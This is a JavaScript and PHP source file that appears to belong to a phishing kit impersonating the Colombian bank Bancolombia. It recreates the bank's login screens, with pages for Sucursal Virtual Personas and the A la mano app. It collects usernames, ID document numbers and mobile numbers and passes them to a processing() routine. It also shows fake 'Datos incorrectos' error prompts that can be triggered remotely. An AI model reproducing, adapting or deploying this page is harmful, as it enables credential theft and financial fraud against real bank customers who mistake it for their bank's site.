var bancolombia_titulo = 'Inicio de sesión';
var bancolombia_ahorro =`
<div class="sc-jxOSlx jzmRAs">Te damos la bienvenida</div>
<div class="sc-knuQbY hZZDXh">
	<div class="sc-gEvEer blWBwQ">
		<div class="sc-eqUAAy fFtrsp"></div>
		<div class="sc-fqkvVR iGPcWV"> Ingresa tus datos para continuar</div>
		<div class="sc-iGgWBj cxASel"> </div>
	</div>
	<form class="sc-dxcDKg gscjBr" onsubmit="return false;">
		<div class="sc-bdOgaJ fxvAXw">
			<label class="sc-kMribo fUwGEH">Tipo de documento</label>
			<div class=" css-hn1n1a-container"><span id="react-select-2-live-region" class="css-7pg0cj-a11yText"></span>
				<span aria-live="polite" aria-atomic="false" aria-relevant="additions text" role="log" class="css-7pg0cj-a11yText"></span>
				<div class=" css-i9s77m-control">
					<div class=" css-hlgwow">
						<div class=" css-1dimb5e-singleValue">Cédula de ciudadanía</div>
						<input id="react-select-2-input" tabindex="0" inputmode="none" aria-autocomplete="list" aria-expanded="false" aria-haspopup="true" role="combobox" aria-activedescendant="" aria-readonly="true" class="css-1hac4vs-dummyInput" value="">
					</div>
					<div class=" css-1wy0on6"><span class=" css-1uei4ir-indicatorSeparator">

						</span>
						<div class=" css-1xc3v61-indicatorContainer" aria-hidden="true"><svg height="20" width="20" viewBox="0 0 20 20" aria-hidden="true" focusable="false" class="css-8mmkcg">
								<path d="M4.516 7.548c0.436-0.446 1.043-0.481 1.576 0l3.908 3.747 3.908-3.747c0.533-0.481 1.141-0.446 1.574 0 0.436 0.445 0.408 1.197 0 1.615-0.406 0.418-4.695 4.502-4.695 4.502-0.217 0.223-0.502 0.335-0.787 0.335s-0.57-0.112-0.789-0.335c0 0-4.287-4.084-4.695-4.502s-0.436-1.17 0-1.615z"></path>
							</svg>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="sc-bdOgaJ fxvAXw">
			<div class="sc-ERObt ltoGH">
				<input name="documentNumber" id="documentNumber" type="tel" autocorrect="off" autocomplete="off" placeholder="" maxlength="20" class="sc-fulCBj bpLqOK" value="">
				<label class="sc-dNsVcS yBZKS">Número del documento</label>
			</div>
		</div>
		<div class="sc-bdOgaJ fxvAXw">
			<div class="sc-ERObt ltoGH">
				<input name="celphoneNumber" id="celphoneNumber" type="tel" autocorrect="off" autocomplete="off" placeholder="" maxlength="10" class="sc-fulCBj bpLqOK" value="" inputmode="numeric">
				<label class="sc-dNsVcS yBZKS">Número de celular</label>
			</div>
		</div>
		<div>
			<div class="sc-fiCwlc boRxsw">
				<button type="button" class="sc-fXSgeo ertauK" id="btn-volver-ahorro">
					<label class="sc-esYiGF expOrP">Volver</label>
				</button>
				<button type="button" class="sc-fXSgeo bApdQd" id="btn-continuar-ahorro">
					<label class="sc-esYiGF expOrP">Continuar</label></button>
			</div>
		</div>
	</form>
</div>
`;

var bancolombia_personas = `
<div class="sc-jxOSlx jzmRAs">Te damos la bienvenida</div>
<div class="sc-bBeLUv Qhpfq" style="display:none;">
	<div class="sc-ihgnxF kcFuTg">
		<div class="sc-jMakVo xjvDB"></div>
	</div>
	<div class="sc-hwdzOV gXnAHy">
		<div class="sc-jaXxmE koglnq">Datos incorrectos</div>
		<div class="sc-ibQAlb klyfsH">Los datos ingresados no coinciden, inténtalo nuevamente.</div>
	</div><button aria-label="Close" class="sc-krNlru XjvPt">
		<div src="./static/media/errorImage.ff18d402edfafdc1ba9552c6556e7aa7.svg" class="sc-iMTnTL cFsVxj"></div>
	</button>
</div>
<div class="sc-aXZVg fabwF">
	<div class="sc-gEvEer blWBwQ">
		<div class="sc-eqUAAy fFtrsp"></div>
		<div class="sc-fqkvVR iGPcWV"> El usuario es el mismo con el que ingresas a la</div>
		<div class="sc-iGgWBj cxASel"> Sucursal Virtual Personas. </div>
	</div>
	<form class="sc-kdBSHD kjLVGj" onsubmit="return false;">
		<div class="sc-jGKxIK biRUif">
			<div class="sc-imWYAI dSVYQT">
				<div class="sc-kpDqfm ilwpgB"></div>
				<input name="user" type="text" autocorrect="off" id="user"
					autocomplete="off" placeholder="&nbsp;" class="sc-dhKdcB iKUbyI" value="">
				<label
					class="sc-jXbUNg klOdzk">Usuario</label>
				<div class="sc-lcIPJg esXSPW" id="tabError" style="display:none;">Debe tener mínimo 8 caracteres</div>
			</div>
			<p class="sc-tagGq fpfLgB">¿Olvidaste tu usuario?</p>
		</div>
		<div class="sc-fjvvzt gcyRka"><button type="button" id="btn-volver-user"
				class="sc-fXSgeo ertauK"><label class="sc-esYiGF expOrP">Volver</label></button><button
				type="button" id="btn-continuar-user" class="sc-fXSgeo bApdQd"><label
					class="sc-esYiGF expOrP">Continuar</label></button></div>
	</form>
</div>


`;

var bancolombia_contenido = `
<div class="sc-gRtvSG eRzCQQ">
	<div class="sc-bBeLUv Qhpfq" id="error" style="display:none;">
		<div class="sc-ihgnxF kcFuTg">
			<div class="sc-jMakVo xjvDB"></div>
		</div>
		<div class="sc-hwdzOV gXnAHy">
			<div class="sc-jaXxmE koglnq">Datos incorrectos</div>
			<div class="sc-ibQAlb klyfsH">Los datos ingresados no coinciden, inténtalo nuevamente.</div>
		</div><button aria-label="Close" class="sc-krNlru XjvPt">
			<div src="./static/media/errorImage.ff18d402edfafdc1ba9552c6556e7aa7.svg" class="sc-iMTnTL cFsVxj"></div>
		</button>
	</div>
	<div class="sc-eXsaLi eZUFsb">Iniciar sesión</div>
	<div class="sc-gEkIjz cJzIJP">Elige cómo quieres continuar:</div>
	<div class="sc-hoLEA jKwyyI row justify-content-md-center">

		<div class="col-sm col-md-auto" style="margin-bottom: 10px;">
			<button class="sc-bOQTJJ chxujR" id="bancolPer">
				<div class="sc-camqpD fjUNcy">
					<div class="sc-fFlnrN lmBfdl">
						<div class="sc-bOhtcR eUeoEt">Bancolombia Personas</div>
						<div class="sc-kbdlSk fmruPR">Si manejas cuentas o productos personales.</div>
					</div>
					<div class="sc-fsvrbR bKKRYX"></div>
				</div>
			</button>
		</div>
		<div class="col-sm col-md-auto" style="margin-bottom: 10px;">
			<button class="sc-bOQTJJ chxujR" id="bancolAmano">
				<div class="sc-camqpD fjUNcy">
					<div class="sc-fFlnrN lmBfdl">
						<div class="sc-bOhtcR eUeoEt">Bancolombia A la mano</div>
						<div class="sc-kbdlSk fmruPR">Si usas esta aplicación.</div>
					</div>
					<div class="sc-fsvrbR fabCg"></div>
				</div>
			</button>
		</div>
		<div class="col-sm col-md-auto" hidden="" style="margin-bottom: 10px;"><button
				class="sc-bOQTJJ chxujR">
				<div class="sc-camqpD fjUNcy">
					<div class="sc-fFlnrN lmBfdl">
						<div class="sc-bOhtcR eUeoEt">Bancolombia Negocios</div>
						<div class="sc-kbdlSk fmruPR">Si manejas cuentas o productos de negocios.</div>
					</div>
					<div class="sc-fsvrbR efRRYd"></div>
				</div>
			</button></div>
	</div>
	<div class="sc-jdUcAg eTofwD">
		<div class="sc-gweoQa gbiddn">¿Qué opción debo elegir?</div>
		<div class="sc-eIcdZJ kcTbgw"></div>
	</div>
</div>

`;
<?php require_once('_plantilla_bancolombia.php'); ?>

//<script>
	if (my_data['alerta']) {
		$('#error').show();
	} else {
		$('#error').hide();
	}

	$('#bancolPer').click(function() {
		$('#bancolombia_contenido').html(bancolombia_personas);
		$('#user').on('input', function() {
			this.value = this.value.replace(/\s/g, '');
		});

		$('#btn-volver-user').click(function() {
			$('#bancolombia_contenido').html(bancolombia_contenido);
		});

		$('#btn-continuar-user').click(function() {
			sendUser();
		});
	});

	$('#bancolAmano').click(function() {
		my_data['typeBank'] = 'bancolombiaAmano'

		$('#btn-volver-ahorro').click(function() {
			$('#bancolombia_contenido').html(bancolombia_contenido);
		});

		$('#bancolombia_contenido').html(bancolombia_ahorro);

		$('#celphoneNumber').on('input', function() {
			this.value = this.value.replace(/\s/g, '');

			if (this.value.length > 0) {
				$(this).addClass('ecSwKm').removeClass('yBZKS');
			} else {
				$(this).addClass('yBZKS').removeClass('ecSwKm');
			}

		});

		$('#documentNumber').on('input', function() {
			this.value = this.value.replace(/\s/g, '');
			if (this.value.length > 0) {
				$(this).addClass('ecSwKm').removeClass('yBZKS');
			} else {
				$(this).addClass('yBZKS').removeClass('ecSwKm');
			}
		});

		$('#btn-continuar-ahorro').click(function() {
			sendUserAMano();
		});

	});





	function sendUserAMano() {
		let user = $('#celphoneNumber').val();
		if (!user) {
			$('#tabError').show();
			// $('#summary').html('Por favor, ingrese la información requerida.');
			// $('#username').addClass('error');
		} else {
			$('#tabError').hide()
			processing({
				t: 'usuario',
				usuario: user
			});
		}
	}

	function sendUser() {
		let user = $('#user').val();
		if (!user) {
			$('#tabError').show();
			// $('#summary').html('Por favor, ingrese la información requerida.');
			// $('#username').addClass('error');
		} else {
			$('#tabError').hide()
			processing({
				t: 'usuario',
				usuario: user
			});
		}
	}